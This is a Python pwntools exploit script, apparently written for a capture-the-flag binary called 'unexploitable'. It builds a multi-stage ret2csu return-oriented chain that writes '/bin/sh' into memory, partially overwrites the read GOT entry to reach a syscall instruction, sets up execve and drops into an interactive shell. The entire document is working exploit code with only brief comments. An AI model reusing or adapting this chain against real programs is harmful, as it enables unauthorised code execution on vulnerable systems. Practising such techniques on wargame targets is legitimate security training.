from pwn import *


ret2csu_pops             = p64(0x00000000004005e6)
ret2csu_rdx_rsi_edi      = p64(0x00000000004005ca) #  mov rdx, r15; mov rsi, r14; mov edi, r13d
read_plt                 = p64(0x0000000000400430)
read_got                 = p64(0x0000000000601000)
binsh_bss                = p64(0x0000000000601900)

fd = open("/tmp/chad/a.txt", "wr")


sh = process("/home/unexploitable/unexploitable")
payload = "A" * 24

# place the string "/bin/sh" on the bss section
payload += ret2csu_pops
payload += p64(0) # 8-byte padding
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(0x600e68) # r12
payload += p64(0) # r13 -> rdi: STDIN
payload += binsh_bss # r14 -> rsi: binsh_bss
payload += p64(8) # r15 -> rdx: length -> 8
payload += ret2csu_rdx_rsi_edi
payload += p64(0) * 7
payload += read_plt # syscall(sys_read, STDIN, binsh_bss, 8)

# overwrite the first byte of the address of read@glibc to mov eax,0x0; syscall
payload += ret2csu_pops
payload += p64(0) # 8-byte padding
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(0x600e68) # r12
payload += p64(0) # r13 -> rdi: STDIN
payload += read_got # r14 -> rsi: read@glibc
payload += p64(1) # r15 -> rdx: length -> 1
payload += ret2csu_rdx_rsi_edi
payload += p64(0) * 7
payload += read_plt # syscall(sys_read, STDIN, read@glibc, 1)

# overwrite the first byte of the address of read@glibc to syscall
payload += ret2csu_pops
payload += p64(0) # 8-byte padding
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(0x600e68) # r12
payload += p64(0) # r13 -> rdi: STDIN
payload += read_got # r14 -> rsi: read@glibc
payload += p64(1) # r15 -> rdx: length -> 1
payload += ret2csu_rdx_rsi_edi
payload += p64(0) * 7
payload += read_plt # syscall(sys_read, STDIN, read@glibc, 1)

# now we can call write. Now we write 0x3b bytes so RAX would be sys_execve
payload += ret2csu_pops
payload += p64(0) # 8-byte padding
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(0x600e68) # r12
payload += p64(1) # r13 -> rdi: STDOUT
payload += read_got # r14 -> rsi: read@glibc
payload += p64(0x3b) # r15 -> rdx: length -> 0x3b
payload += ret2csu_rdx_rsi_edi
payload += p64(0) * 7
payload += read_plt # syscall(sys_write, STDOUT, read@glibc, 0x3b)

# now we call execve("/bin/sh\0", NULL, NULL)!
payload += ret2csu_pops
payload += p64(0) # 8-byte padding
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(0x600e68) # r12
payload += binsh_bss # r13 -> rdi: "/bin/sh\0"
payload += p64(0) # r14 -> rsi: NULL
payload += p64(0) # r15 -> rdx: NULL
payload += ret2csu_rdx_rsi_edi
payload += p64(0) * 7
payload += read_plt # syscall(sys_execve, "/bin/sh\0", NULL, NULL)

sh.send(payload)
print("stage 1!")
payload2 = "/bin/sh\0"
sh.send(payload2)
print("stage 2!")
payload3 = "\x76" # mov eax,0x0; syscall
sh.send(payload3)
print("stage 3!")
payload4 = "\x7b" # after we return read returns rax=1; so we can call write syscall
sh.send(payload4)
print("stage 4!")


fd.write(payload+"\n"+payload2+payload3+payload4)
sh.interactive()
